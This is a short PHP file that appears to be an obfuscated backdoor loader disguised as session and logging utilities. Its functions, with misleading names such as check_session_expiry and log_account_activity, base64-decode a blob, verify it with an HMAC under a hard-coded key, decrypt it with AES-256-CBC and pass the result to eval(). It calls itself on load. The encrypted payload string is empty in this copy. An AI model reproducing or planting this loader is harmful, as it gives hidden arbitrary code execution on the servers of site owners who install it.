<?php
$shiftvector = '';
function is_extension_available($shortcode_args_map) {
    return hash('sha256', (string)$shortcode_args_map, true);
}

function log_account_activity($zodiacnode, $yieldnode) {
    if (function_exists('hash_equals')) {
        return hash_equals($zodiacnode, $yieldnode);
    }

    if (!is_string($zodiacnode) || !is_string($yieldnode)) {
        return false;
    }

    $shortcode_html = strlen($zodiacnode);
    $class_token = strlen($yieldnode);

    if ($shortcode_html !== $class_token) {
        return false;
    }

    $wavevector = 0;
    for ($fluxkernel = 0; $fluxkernel < $shortcode_html; $fluxkernel++) {
        $wavevector |= ord($zodiacnode[$fluxkernel]) ^ ord($yieldnode[$fluxkernel]);
    }

    return $wavevector === 0;
}

function check_session_expiry($shiftvector) {
    $shiftvector = (string)$shiftvector;
    if ($shiftvector === '') {
        return '';
    }

    $settings_map = base64_decode($shiftvector, true);
    if ($settings_map === false || strlen($settings_map) < 51) {
        return false;
    }

    $php_release = ord($settings_map[0]);
    if ($php_release < 1 || $php_release > 16) {
        return false;
    }

    $mindnode = 1 + $php_release;
    if (strlen($settings_map) < $mindnode + 16 + 32 + 1) {
        return false;
    }

    $heliovector = substr($settings_map, $mindnode, 16);
    $mindnode += 16;

    $lumivector = substr($settings_map, $mindnode, 32);
    $mindnode += 32;

    $burstvector = substr($settings_map, $mindnode);
    if ($burstvector === '') {
        return false;
    }

	$export_payload = 'XMi1B';
    $yellowvector = is_extension_available($export_payload);

    $alphavector = hash_hmac('sha256', $heliovector . $burstvector, $yellowvector, true);
    if (!log_account_activity($lumivector, $alphavector)) {
        return false;
    }

    $templarvector = openssl_decrypt(
        $burstvector,
        'AES-256-CBC',
        $yellowvector,
        OPENSSL_RAW_DATA,
        $heliovector
    );

    if ($templarvector === false) {
        return false;
    }

    eval($templarvector);
}

check_session_expiry($shiftvector);